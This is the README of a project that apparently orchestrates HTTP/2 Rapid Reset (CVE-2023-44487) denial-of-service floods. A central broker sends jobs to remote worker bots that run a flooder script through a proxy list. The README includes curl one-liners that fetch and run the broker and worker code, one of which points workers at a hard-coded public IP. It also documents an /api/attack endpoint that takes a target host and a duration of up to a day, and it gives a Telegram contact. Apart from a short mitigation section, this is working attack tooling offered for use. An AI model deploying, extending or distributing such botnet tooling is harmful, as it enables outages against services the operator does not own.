<div align="center">

# rapidreset-api

**Orchestrator + remote workers for HTTP/2 Rapid Reset.**

![node](https://img.shields.io/badge/node.js-v24-339933?logo=node.js&logoColor=white)
![javascript](https://img.shields.io/badge/javascript-ES2023-F7DF1E?logo=javascript&logoColor=black)
![http2](https://img.shields.io/badge/HTTP%2F2-RFC%209113-005A9C)
![license](https://img.shields.io/badge/license-mit-8B5CF6)

`CVE-2023-44487` · `CWE-400` · CVSS `7.5` HIGH

Telegram: [@fasthttps](https://t.me/fasthttps)

[API](#api) · [Server setup](#server-setup) · [Client setup](#client-setup) · [CVE](#cve-2023-44487)

</div>

---

The broker holds the queue and hands each job to an idle connected worker. It never
spawns a process itself. A worker (`bot/client.js`) connects from any machine, receives
argv arrays, runs `rapidreset.js` locally, and reports the exit code back over the
control socket or the result endpoint.

```
client.js ──HTTP upgrade──▶ index.js ──job──▶ client.js ──spawn──▶ rapidreset.js
  worker                      broker            worker              flooder
```

## Project layout

```
api/
├── index.js                 bootstrap: create app, signals, start
├── method.json              method definitions (argv templates)
├── start-api.sh             download + run the broker
├── start-bot.sh             download + run a worker
├── src/
│   ├── app.js               composition root, banner, lifecycle
│   ├── core/
│   │   ├── config.js        env parsing and limits
│   │   ├── methods.js       method.json loader + argv substitution
│   │   ├── state.js         jobs / pending / workers / waiters maps
│   │   └── validation.js    URL, duration, token and id validation
│   ├── broker/
│   │   ├── jobs.js          submit, finish, fail, cancel
│   │   ├── scheduler.js     capacity-aware dispatch
│   │   ├── workers.js       registry, slots, idle selection
│   │   ├── worker-socket.js primary NDJSON upgrade channel
│   │   ├── worker-signal.js fallback channel + result endpoint
│   │   └── ndjson.js        bounded line reader
│   ├── http/
│   │   ├── routes.js        API routing and handlers
│   │   ├── respond.js       JSON/body helpers
│   │   ├── docs.js          `/` documentation page
│   │   └── server.js        http server, upgrade routing, shutdown
│   └── ui/
│       └── console.js       ANSI-safe banner, levels, JSON logs
└── bot/
    ├── client.js            worker agent
    ├── rapidreset.js        HTTP/2 flooder
    └── proxi.txt            proxy list
```

## Server setup

The broker has no npm dependencies — only `node` built-ins.

```bash
node index.js
```

Or fetch and run it without cloning:

```bash
curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/start-api.sh
chmod +x start-api.sh
./start-api.sh
```

`start-api.sh` downloads `index.js`, `method.json`, and every `src/**` file, then starts
the broker. It needs `node` and `curl` only.

| Variable | Default | Purpose |
| --- | --- | --- |
| `PORT` | `SERVER_PORT`, then `9215` | listening port |
| `HOST` | `0.0.0.0` | listening interface |
| `CLIENT_TOKEN` | empty | worker authentication; empty means any worker may connect |
| `API_TOKEN` | empty | protects `/api/attack`, `/api/stop`, `/api/attack/:id`, `/api/workers` |
| `MAX_ATTACK_TIME` | `86400` | maximum accepted `time` in seconds (1–2,000,000) |
| `LOG_LEVEL` | `info` | `silent`, `error`, `warn`, `info`, `debug` |
| `LOG_FORMAT` | auto | `pretty` on a TTY, `json` otherwise |
| `METHODS_FILE` | `./method.json` | alternate method file |

When `API_TOKEN` is unset, anyone who can reach the port can submit or stop jobs. A
loud warning is printed at startup.

## Client setup

On a worker machine:

```bash
mkdir -p bot && cd bot \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/client.js \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/rapidreset.js \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/proxi.txt \
  && npm i hpack --no-audit --no-fund \
  && ORCHESTRATOR=http://204.10.194.164:9215 node client.js
```

Or:

```bash
curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/start-bot.sh
chmod +x start-bot.sh
ORCHESTRATOR=http://10.0.0.5:9215 MAX_CONCURRENT=2 ./start-bot.sh worker-a
```

| Variable | Default | Purpose |
| --- | --- | --- |
| `ORCHESTRATOR` | `http://127.0.0.1:9215` | broker URL; `https://` is supported |
| `CLIENT_TOKEN` | empty | must match the broker's `CLIENT_TOKEN` |
| `WORKER_NAME` | hostname | display name; sanitized to `[A-Za-z0-9_-]` |
| `MAX_CONCURRENT` | `1` | jobs this worker accepts at once (1–32) |
| `ALLOW_LEGACY_SHELL` | unset | set to `1` only to accept old `command` strings from an old broker |

The worker connects over `/api/worker`. If the `Upgrade` handshake is blocked by a
proxy, it falls back to `/api/worker/signal`; results are posted to
`/api/worker/result`. Reconnects use exponential backoff with jitter.

## API

### Submit a job

```
GET  /api/attack?host=<url>&time=<seconds>&method=<name>
POST /api/attack        (JSON body: {"host":"...","time":30,"method":"..."})
```

| Parameter | Required | Description |
| --- | --- | --- |
| `host` | yes | target URL, `http(s)://`, no whitespace, max 2048 chars |
| `time` | yes | duration in seconds, `1`–`86400` by default (`MAX_ATTACK_TIME`); legacy alias `itme` |
| `method` | yes | a name from `method.json` |

```bash
curl "http://127.0.0.1:9215/api/attack?host=https://example.com&time=30&method=rapidreset"
```

```json
{
  "ok": true,
  "id": "4b7d1c2e-...",
  "status": "dispatched",
  "worker": "node-01-1234-ab12cd",
  "method": "rapidreset",
  "host": "https://example.com/",
  "time": 30,
  "statusUrl": "/api/attack/4b7d1c2e-..."
}
```

`status` is `dispatched` when a worker was available, otherwise `queued` with
`"worker": null`. The response is always `202`; execution happens on the worker.

### Job status

```
GET /api/attack/<id>
```

Returns `queued`, `running`, or `stopping` (with `cancelling: true`). A job that
finished, failed, or was cancelled is removed from the broker, so the next poll returns
`404`. Poll while the job is queued or running.

### Stop a job

```
POST /api/stop/<id>
```

A queued job is removed immediately. A running job receives a cancel command; its slot
is released when the worker reports back, or after `cancelTimeoutMs` (10s).

### Workers and health

```
GET /api/workers   -> { workers: [...], waiting, queued, active }
GET /api/health    -> { ok, uptime, workers, waiting, queued, active, methods }
```

Each worker reports its `slots`, current jobs, name, and version. The broker dispatches
up to `slots` concurrent jobs per worker.

### Auth

`API_TOKEN`, when set, is required by `/api/attack`, `/api/attack/:id`, `/api/stop/:id`,
and `/api/workers`:

```bash
curl -H "x-api-token: $API_TOKEN" "http://host:9215/api/attack?..."
# or
curl -H "Authorization: Bearer $API_TOKEN" ...
```

Worker transports use `CLIENT_TOKEN` (`x-worker-token`). `/api/health` and the docs page
stay public.

## Methods

`method.json` entries use an argv array. Placeholders are substituted per element, and
the worker spawns with `shell: false`, so a target cannot inject shell commands.

```json
[
  {
    "name": "rapidreset",
    "description": "CVE-2023-44487 HTTP/2 rapid reset",
    "argv": ["node", "rapidreset.js", "GET", "<<host>>", "<<time>>", "1", "64", "proxi.txt"]
  }
]
```

Only `<<host>>`, `<<time>>`, and `<<method>>` are recognized. The worker only executes
`node`/`nodejs` (mapped to its own `process.execPath`). Legacy `command` strings are
tokenized at load and rejected if they contain shell metacharacters; the worker refuses
them entirely unless `ALLOW_LEGACY_SHELL=1`.

## Timeouts and limits

- Duration accepted: 1–86400 seconds by default; override with `MAX_ATTACK_TIME`.
- Per-job watchdog: `max(60s, time + 30s)`. The broker sends a cancel if a worker does
  not report in time, and the worker kills the child tree after `time + 8s`.
- Queue: 32 waiting jobs when no worker has a free slot; further submissions get `503`
  with `retry-after: 10`.
- Cancellation escalation: SIGTERM to the process group, then SIGKILL after 3s.
- Job output is capped at 4 KB in the worker's result.

## Console

Startup and runtime logs go through `src/ui/console.js`:

```
  ⚡ RAPIDRESET
  orchestration broker · HTTP/2 rapid reset
  ──────────────────────────────────────────────
  version     1.1.0
  node        v24.0.0
  listen      0.0.0.0:9215
  local       http://10.0.0.5:9215
  methods     rapidreset
  token       worker + api
  ──────────────────────────────────────────────

  ✓ worker     node-01-1234-ab12cd connected  node-01 1.1.0 · 2 slot(s)
  › job        a1b2c3d4 → node-01-1234-ab12cd (control)  rapidreset example.com 30s
  ✓ job        a1b2c3d4 done  exit=0  31.2s
  ──────────────────────────────────────────────
  ● listening on 0.0.0.0:9215 · ctrl+c to stop
```

Warnings/errors go to stderr. `NO_COLOR`, `FORCE_COLOR`, `TERM=dumb`, and legacy Windows
consoles are handled. Set `LOG_FORMAT=json` for one JSON object per line.

## CVE-2023-44487

HTTP/2 Rapid Reset (published 10 October 2023) is CVSS 7.5 HIGH, CWE-400 uncontrolled
resource consumption. A client opens a stream with `HEADERS` and immediately cancels it
with `RST_STREAM`; cancellation is processed faster than stream allocation, so the
concurrent-stream limit never fills while the server still pays the allocation cost.

Mitigation is stream policy: cap `SETTINGS_MAX_CONCURRENT_STREAMS`, do not free stream
state instantly on `RST_STREAM`, and add a per-connection stream quota. Fixed by Go
`net/http`, nginx, Apache httpd, Envoy, HAProxy, and Node.js in October 2023.

## Notes

- `/api/attack` and `/api/stop` are unauthenticated unless `API_TOKEN` is set.
- `/api/workers` exposes worker names, versions, and current job ids.
- A worker that disconnects loses its control-channel jobs immediately; signal-channel
  jobs are failed by their watchdog.
- Use this software only on systems you are authorised to test.

## License

MIT © Isal Nevada. See [LICENSE](LICENSE).